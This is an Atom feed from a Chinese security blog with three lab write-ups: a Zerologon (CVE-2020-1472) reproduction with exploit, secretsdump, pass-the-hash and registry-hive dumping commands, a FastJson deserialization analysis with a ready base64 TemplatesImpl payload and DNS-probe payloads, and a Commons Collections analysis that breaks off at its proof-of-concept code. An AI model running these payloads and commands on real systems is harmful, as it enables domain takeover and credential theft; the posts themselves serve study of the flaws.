<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Sriracha :)</title>
  
  <subtitle>Wow, the smell is great!</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://sherlocz.github.io/"/>
  <updated>2020-09-16T14:30:58.989Z</updated>
  <id>http://sherlocz.github.io/</id>
  
  <author>
    <name>sher10ck</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2020-1472(域内提权)漏洞复现</title>
    <link href="http://sherlocz.github.io/2020/09/16/CVE-2020-1472/"/>
    <id>http://sherlocz.github.io/2020/09/16/CVE-2020-1472/</id>
    <published>2020-09-16T08:41:58.000Z</published>
    <updated>2020-09-16T14:30:58.989Z</updated>
    
    <content type="html"><![CDATA[<p>2020年9月16日 星期二  阴</p><p>深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明天又要穿上白衬衫，继续假装自己是5年工作经验的安全专家，今晚终于认清现实，活捉红队0day依然是我们遥不可及的梦。</p><p>生而为人，谁都是第一次。</p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p><a href="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="https://sherlocz.github.io/2020/01/31/%E7%AE%80%E5%8D%95%E7%9A%84%E5%9F%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">简单的域环境搭建</a></p><p>发现环境还有，稍微改了一下：</p><ul><li>Domain:hacke</li><li>Windows server 2012(DC) 192.168.43.100</li><li>Windows server 2008    192.168.43.101</li><li>Windows7    192.168.43.102</li><li>Kali(攻击机器)    192.168.43.105</li></ul><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用过程：将域控密码设置为空-&gt;读取hash-&gt;读取sam文件hash(ntds.dit)-&gt;恢复域控密码</p><p>要安装impacket:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure></p><p>下载我们的poc(下文有下载连接)<br>执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py &#123;computer name&#125; &#123;ip&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/1.png" alt></p><p>执行成功之后，密码就会修改为空(修改的是域控的机器密码，不是域控的密码)，接下来用impacket中的/impacket/examples/secretsdump.py来读取域控中的hash</p><p><img src="/2020/09/16/CVE-2020-1472/2.png" alt></p><p>当我们获取了hash之后(这里应该是域管的)，我们可以读取域控制器中sam文件的hash，用来获取之前机器的原始密码(<a href="读取SAM和SYSTEM文件中的NTLM-HASH" title="https://sherlocz.github.io/2020/02/02/%E4%BD%BF%E7%94%A8Mimikatz%E8%AF%BB%E5%8F%96SAM%E5%92%8CSYSTEM%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84NTLM-HASH/">读取SAM和SYSTEM文件中的NTLM-HASH</a>)</p><p>通过wmiexec执行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ython3 wmiexec.py -hashes xxxxxx hacke/Administrator@192.168.43.100</span><br></pre></td></tr></table></figure></p><p>然后将三个文件搞下来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\sam sam.hive</span><br><span class="line">reg save hklm\system system.hive</span><br><span class="line">reg save hklm\security security.hive</span><br><span class="line"></span><br><span class="line">get sam.hive</span><br><span class="line">get system.hive</span><br><span class="line">get security.hive</span><br></pre></td></tr></table></figure></p><p>读取sam里面的hash：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.hive -security security.hive -system system.hive  LOCAL</span><br></pre></td></tr></table></figure></p><p><img src="/2020/09/16/CVE-2020-1472/4.png" alt><br>居然吧我之前修改过的历史密码也读取出来了，也不知道为啥 == </p><p>最后，利用脚本传入hash，恢复之前的密码<br><img src="/2020/09/16/CVE-2020-1472/5.png" alt></p><p>再来检查密码是否正确(之前修改后密码为空)<br><img src="/2020/09/16/CVE-2020-1472/6.png" alt></p><p><img src="/2020/09/16/CVE-2020-1472/7.png" alt></p><h1 id="Poc-Exp"><a href="#Poc-Exp" class="headerlink" title="Poc/Exp"></a>Poc/Exp</h1><p><a href="https://github.com/dirkjanm/CVE-2020-1472" target="_blank" rel="noopener">https://github.com/dirkjanm/CVE-2020-1472</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/risksense/zerologon" target="_blank" rel="noopener">https://github.com/risksense/zerologon</a></p><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&amp;mid=2247487380&amp;idx=2&amp;sn=2723d6d6eca3b3b1460dbe7bedb860ca&amp;chksm=eafa47d8dd8dcece7b0b01c331f750da994e7c6483e9839e2752ea830b59c72c72c9ea031e68&amp;mpshare=1&amp;scene=1&amp;srcid=0915K0mh2x5HCSuWhim4a8lF&amp;sharer_sharetime=1600248655858&amp;sharer_shareid=603d3452a1da35dfaf9195077f79f3de&amp;key=3f730bd43b5106bfcfc536175a58a4f9591d1b260793c8320f040377f9e45b3f7b1781c4506ae0c3fc8415c1b2f8d9435f1fded377146fc29d269caa557b9830bdeeb81c8686131660911572d1ada5ea854d9300322be78d605613b9f1bd019df785e35a2a1741b74c3f37802d1c6fd84fd1b01daa33a9697d6a2b667626c94c&amp;ascene=1&amp;uin=MjYzNzcxNDgzMw%3D%3D&amp;devicetype=Windows+10+x64&amp;version=62090529&amp;lang=zh_CN&amp;exportkey=Ay8gAj7ggbwWBs6jC8EQrCI%3D&amp;pass_ticket=31feuN9eshIctUXUsMy%2Fwuj0mP%2BK04tjRZZR3Gpdd1gV5CwB6kJIS0W2DnYDEWGx&amp;wx_header=0" title="Netlogon 特权提升漏洞-CVE-2020-1472-原理分析与验证" target="_blank" rel="noopener">Netlogon 特权提升漏洞(CVE-2020-1472)原理分析与验证</a></p><p>看不懂，那咋办啊~</p><h1 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h1><p><img src="/2020/09/16/CVE-2020-1472/8.png" alt><br>上午看见发布了部分代码，下午就更新了，不给过mimikatz太敏感，后续还得想想免杀叭</p><p><img src="/2020/09/16/CVE-2020-1472/mimikatz.gif" alt></p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a><br><a href="https://github.com/DimopoulosElias/SimpleMimikatzObfuscator" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleMimikatzObfuscator</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;2020年9月16日 星期二  阴&lt;/p&gt;
&lt;p&gt;深夜难眠，回想起今天waf上一大堆误报和寥寥无几的告警，甲方爸爸提供的两荤一素已经换成了白粥榨菜，农夫已经换成了怡宝，猪肉换成了榨菜，或许我们是时长一个月实习生的身份，已经彻底暴露了，明天不知道是不是只能吃开水泡面了。唉，明
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>FastJson&lt;1.2.24反序列化漏洞分析</title>
    <link href="http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/"/>
    <id>http://sherlocz.github.io/2020/08/27/FastJson-1-2-24/</id>
    <published>2020-08-27T05:39:11.000Z</published>
    <updated>2020-08-30T06:00:17.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h1><p>FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们的对象序列化成Json，也可以将我们恶意的Json反序列化为恶意对象，从而执行命令。</p><h1 id="FastJson的序列化与反序列化"><a href="#FastJson的序列化与反序列化" class="headerlink" title="FastJson的序列化与反序列化"></a>FastJson的序列化与反序列化</h1><p>新建maven项目，修改pom.xml：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https://mvnrepository.com/artifact/com.alibaba/fastjson --&gt;&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;com.alibaba&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;fastjson&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;1.2.23&lt;/version&gt;&lt;/dependency&gt;</span><br></pre></td></tr></table></figure></p><p>首先我们创建一个我们需要序列化的对象，对象属性为私有，设置好set/get方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.annotation.JSONField;</span><br><span class="line"></span><br><span class="line">import java.util.Date;</span><br><span class="line"></span><br><span class="line">public class Person &#123;</span><br><span class="line">    @JSONField(name = &quot;AGE&quot;)</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;FULL NAME&quot;)</span><br><span class="line">    private String fullName;</span><br><span class="line"></span><br><span class="line">    @JSONField(name = &quot;DATE OF BIRTH&quot;)</span><br><span class="line">    private Date dateOfBirth;</span><br><span class="line"></span><br><span class="line">    public Person(int age, String fullName, Date dateOfBirth) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.age = age;</span><br><span class="line">        this.fullName= fullName;</span><br><span class="line">        this.dateOfBirth = dateOfBirth;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setAge(int age) &#123;</span><br><span class="line">        this.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getFullName() &#123;</span><br><span class="line">        return fullName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void setFullName(String fullName) &#123;</span><br><span class="line">        this.fullName = fullName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>接下来我们用FastJson来序列化对象，利用其内置的toJSONString方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line">import com.alibaba.fastjson.parser.Feature;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.junit.Before;</span><br><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.PipedWriter;</span><br><span class="line">import java.util.ArrayList;</span><br><span class="line">import java.util.Date;</span><br><span class="line">import java.util.List;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Person John = new Person(15, &quot;John Doe&quot;, new Date());</span><br><span class="line">        //序列化</span><br><span class="line">        String jsonOutput= JSON.toJSONString(John);</span><br><span class="line">        System.out.println(jsonOutput);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;AGE&quot;:15,&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;&#125;</span><br></pre></td></tr></table></figure></p><p>我们也可以将上述的JSON格式反序列化为对象：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//反序列化</span><br><span class="line">Object obj1 = JSON.parseObject(jsonOutput);</span><br><span class="line">System.out.println(obj1);</span><br><span class="line">System.out.println(obj1.getClass().getName());</span><br></pre></td></tr></table></figure></p><p>输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;DATE OF BIRTH&quot;:1598507249938,&quot;FULL NAME&quot;:&quot;John Doe&quot;,&quot;AGE&quot;:15&#125;</span><br><span class="line">com.alibaba.fastjson.JSONObject</span><br></pre></td></tr></table></figure></p><p>同时我们可以通过FastJson的@type指定我们需要反序列化的类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package com.s1;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line">import com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line">public class fastjsonTestDemo &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String myJSON = &quot;&#123;\&quot;@type\&quot;:\&quot;Person\&quot;,\&quot;AGE\&quot;:15,\&quot;dateOfBirth\&quot;:1598336520384,\&quot;fullName\&quot;:\&quot;sher10ck\&quot;&#125;&quot;;</span><br><span class="line">        JSONObject Ps = JSON.parseObject(myJSON);</span><br><span class="line">        System.out.println(Ps);</span><br><span class="line">        System.out.println(&quot;result =&gt; &quot; + Ps.get(&quot;fullName&quot;));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;Person&quot;,&quot;fullName&quot;:&quot;John Doe&quot;,&quot;dateOfBirth&quot;:1598336520384,&quot;AGE&quot;:15&#125;</span><br><span class="line">result =&gt; sher10ck</span><br></pre></td></tr></table></figure></p><p>下一步就是想办法传入我们的恶意Json</p><p>搭建环境war包：<br><a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a></p><h1 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h1><p>弹出计算器payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,&quot;_bytecodes&quot;:[&quot;yv66vgAAADEALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQANTHBlcnNvbi9UZXN0OwEACkV4Y2VwdGlvbnMHACUBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsHACYBAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAHAAgHACcMACgAKQEABGNhbGMMACoAKwEAC3BlcnNvbi9UZXN0AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAE2phdmEvaW8vSU9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAADAAEABwAIAAIACQAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgAKAAAADgADAAAADwAEABAADQARAAsAAAAMAAEAAAAOAAwADQAAAA4AAAAEAAEADwABABAAEQABAAkAAABJAAAABAAAAAGxAAAAAgAKAAAABgABAAAAFQALAAAAKgAEAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABQAFQACAAAAAQAWABcAAwABABAAGAACAAkAAAA/AAAAAwAAAAGxAAAAAgAKAAAABgABAAAAGgALAAAAIAADAAAAAQAMAA0AAAAAAAEAEgATAAEAAAABABkAGgACAA4AAAAEAAEAGwABABwAAAACAB0=&quot;],&apos;_name&apos;:&apos;a.b&apos;,&apos;_tfactory&apos;:&#123; &#125;,&quot;_outputProperties&quot;:&#123; &#125;&#125;</span><br></pre></td></tr></table></figure></p><p>运行效果：<br><img src="/2020/08/27/FastJson-1-2-24/calc.png" alt></p><h1 id="DNSLOG检测"><a href="#DNSLOG检测" class="headerlink" title="DNSLOG检测"></a>DNSLOG检测</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;dnslog&quot;&#125;&#125;</span><br><span class="line">&#123;&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;, &#123;&quot;@type&quot;: &quot;java.net.URL&quot;, &quot;val&quot;:&quot;dnslog&quot;&#125;&#125;&quot;&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:&quot;aaa&quot;&#125;</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;]</span><br><span class="line">Set[&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;</span><br><span class="line">&#123;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;dnslog&quot;&#125;:0&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/weixin_45714179/article/details/103237473" target="_blank" rel="noopener">https://blog.csdn.net/weixin_45714179/article/details/103237473</a></p><p><a href="http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">http://www.lmxspace.com/2019/06/29/FastJson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p><p><a href="https://www.freebuf.com/vuls/208339.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/208339.html</a></p><p><a href="https://yoga7xm.top/2019/07/20/fastjson/" target="_blank" rel="noopener">https://yoga7xm.top/2019/07/20/fastjson/</a></p><p><a href="https://www.freebuf.com/news/232758.html" target="_blank" rel="noopener">https://www.freebuf.com/news/232758.html</a></p><p><a href="https://paper.seebug.org/994/" target="_blank" rel="noopener">https://paper.seebug.org/994/</a></p><p><a href="https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/" target="_blank" rel="noopener">https://www.kingkk.com/2019/07/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1-2-24-1-2-48/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;FastJson&quot;&gt;&lt;a href=&quot;#FastJson&quot; class=&quot;headerlink&quot; title=&quot;FastJson&quot;&gt;&lt;/a&gt;FastJson&lt;/h1&gt;&lt;p&gt;FastJson为阿里巴巴维护的一个json库，被称为JAVA中最快的Json库，它能将我们
      
    
    </summary>
    
    
    
      <category term="JAVA" scheme="http://sherlocz.github.io/tags/JAVA/"/>
    
  </entry>
  
  <entry>
    <title>Apache-Commons-Collections漏洞组件反序列化分析</title>
    <link href="http://sherlocz.github.io/2020/08/04/Apache-Commons-Collections%E6%BC%8F%E6%B4%9E%E7%BB%84%E4%BB%B6%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"/>
    <id>http://sherlocz.github.io/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/</id>
    <published>2020-08-04T09:23:14.000Z</published>
    <updated>2020-08-07T13:37:25.681Z</updated>
    
    <content type="html"><![CDATA[<p>其实漏洞原理都看懂了，但是去看其他框架的反序列化漏洞还是有点迷糊，还是做下笔记叭！</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Apache Commons Collections 是一个扩展了Java标准库里的Collection结构的第三方基础库，是一个很常见的库，这个漏洞影响了后续很多的框架（如Weblogic、Shiro、JBoss、WebSphere等）</p><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>反射为JAVA中特有的机制，可以通过反射调用任意类的方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.reflect.InvocationTargetException;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">public class JavaDemo &#123;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        Class cl = Class.forName(&quot;java.lang.Runtime&quot;);</span><br><span class="line">        Method method = cl.getMethod(&quot;getRuntime&quot;);</span><br><span class="line">        Method execmethod = cl.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">        Object runtime = method.invoke(cl);</span><br><span class="line">        execmethod.invoke(runtime,&quot;calc.exe&quot;);</span><br><span class="line">//Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/invoke.png" alt></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>反序列化是由于我们readObject的对象重写了readObject方法，若我们重写过后的这个方法包含恶意代码则会执行，在平时开发的时候开发人员一般不会让readObject直接利用Runtime执行命令。</p><p>所以我们要找到一个重写了readObject的类，并且我们通过这个类的其他方调用Runtime来实现执行命令。</p><h1 id="CC链"><a href="#CC链" class="headerlink" title="CC链"></a>CC链</h1><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><p>idea新建maven工程，pom.xml中添加：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/jar.png" alt><br>会直接给我们导入commons collections组件，这里若是报错了估计是网络的原因无法访问maven的中央仓库，这时我们在maven的setting.xml中设置为阿里仓库，再配置下项目调用的setting.xml文件就行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;mirror&gt;</span><br><span class="line">     &lt;id&gt;nexus&lt;/id&gt;</span><br><span class="line">     &lt;mirrorOf&gt;*&lt;/mirrorOf&gt; </span><br><span class="line">     &lt;url&gt;http://maven.aliyun.com/nexus/content/groups/public/&lt;/url&gt;</span><br><span class="line">   &lt;/mirror&gt;</span><br><span class="line">   &lt;mirror&gt;</span><br><span class="line">     &lt;id&gt;nexus-public-snapshots&lt;/id&gt;</span><br><span class="line">     &lt;mirrorOf&gt;public-snapshots&lt;/mirrorOf&gt;</span><br><span class="line">     &lt;url&gt;http://maven.aliyun.com/nexus/content/repositories/snapshots/&lt;/url&gt;</span><br><span class="line">   &lt;/mirror&gt;</span><br></pre></td></tr></table></figure></p><p><img src="/2020/08/04/Apache-Commons-Collections漏洞组件反序列化分析/setting.png" alt></p><h1 id="POC代码"><a href="#POC代码" class="headerlink" title="POC代码"></a>POC代码</h1><p>jdk1.7环境下运行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 